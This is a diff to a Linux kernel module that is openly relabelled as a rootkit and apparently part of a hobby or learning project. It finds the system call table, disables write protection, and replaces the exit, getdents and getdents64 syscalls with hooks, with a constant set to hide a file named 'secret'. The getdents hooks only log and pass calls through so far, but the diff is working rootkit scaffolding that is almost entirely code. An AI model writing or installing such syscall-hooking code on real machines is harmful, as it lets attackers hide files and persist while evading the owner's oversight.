@@ -5,16 +5,55 @@
 #include <asm/unistd.h> // contains syscall numbers
 #include <linux/kprobes.h>
 #include <asm/pgtable_types.h>
+#include <linux/kallsyms.h>
 
 MODULE_AUTHOR("Parth Thakkar");
-MODULE_DESCRIPTION("chardev driver");
+MODULE_DESCRIPTION("Rootkit");
 MODULE_LICENSE("GPL");
 
 
+#define HIDE_FILE "secret"
 
+
+
+// struct linux_dirent {
+//                unsigned long  d_ino;     /* Inode number */
+//                unsigned long  d_off;     /* Not an offset; see below */
+//                unsigned short d_reclen;  /* Length of this linux_dirent */
+//                char           d_name[];  /* Filename (null-terminated) */
+//                                  /* length is actually (d_reclen - 2 -
+//                                     offsetof(struct linux_dirent, d_name)) */
+//                /*
+//                char           pad;       // Zero padding byte
+//                char           d_type;    // File type (only since Linux
+//                                          // 2.6.4); offset is (d_reclen - 1)
+//                */
+//            }
+
+
+
+struct linux_dirent{
+	long d_ino;
+	off_t d_off;
+	unsigned short d_reclen;
+	char d_name[];
+};
+
+struct linux_dirent64 {
+    ino_t        d_ino;    /* 64-bit inode number */
+    off_t        d_off;    /* 64-bit offset to next structure */
+    unsigned short d_reclen; /* Size of this dirent */
+    unsigned char  d_type;   /* File type */
+    char           d_name[]; /* Filename (null-terminated) */
+};
+
+
+asmlinkage long (*original_getdents64)(int fd, struct linux_dirent64 * dirp, unsigned int count);
+asmlinkage long (*original_getdents)(int fd, struct linux_dirent * dirp, unsigned int count);
 asmlinkage int (*original_sys_exit)(int);
+
 uint8_t was_writable = 0;
-void **sys_call_table_addr = (void *)0xffffffff9b800280;
+void **sys_call_table_addr = (void *)0xffffffff88400280;
 
 
 // referanc https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
@@ -125,14 +164,48 @@ asmlinkage int custom_sys_exit(int error_no){
     return original_sys_exit(error_no);
 }
 
+
+asmlinkage long fake_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
+    printk("Fake getdents64 called \n");
+    
+    return original_getdents64(fd, dirp, count);
+}
+
+asmlinkage long fake_getdents(int fd, struct linux_dirent * dirp, unsigned int count) {
+    printk("Fake getdents called \n");
+    
+    return original_getdents(fd, dirp, count);
+}
+
+
+
 static int __init custom_init(void)
 {
     int ret = 0;
     printk(KERN_INFO "Init\n");
+
+
+    //get and store sys_call_table ptr
+    sys_call_table_addr = (void *)kallsyms_lookup_name("sys_call_table");
+    if (sys_call_table_addr == NULL)
+    {
+        pr_info("sys_call_table not found using kallsyms\n");
+        return -1;
+    }
+
+    printk(KERN_INFO "sys_call_table pointer is %p\n", sys_call_table_addr);
+
     make_rw((unsigned long)sys_call_table_addr);
     original_sys_exit = sys_call_table_addr[__NR_exit];
     sys_call_table_addr[__NR_exit] = (void *)custom_sys_exit;
-     make_ro((unsigned long)sys_call_table_addr);
+
+    original_getdents = sys_call_table_addr[__NR_getdents];
+    sys_call_table_addr[__NR_getdents] = (void *)fake_getdents;
+
+    original_getdents64 = sys_call_table_addr[__NR_getdents64];
+    sys_call_table_addr[__NR_getdents64] = (void *)fake_getdents64;
+
+    make_ro((unsigned long)sys_call_table_addr);
 
     return ret;
 }
@@ -143,6 +216,8 @@ static void __exit custom_exit(void){
 
     make_rw((unsigned long)sys_call_table_addr);
     sys_call_table_addr[__NR_exit] = original_sys_exit;
+    sys_call_table_addr[__NR_getdents] = original_getdents;
+    sys_call_table_addr[__NR_getdents64] = original_getdents64;
     make_ro((unsigned long)sys_call_table_addr);
 
     printk(KERN_INFO "Noooooo..... my interception ,,,,,  exiting....\n");
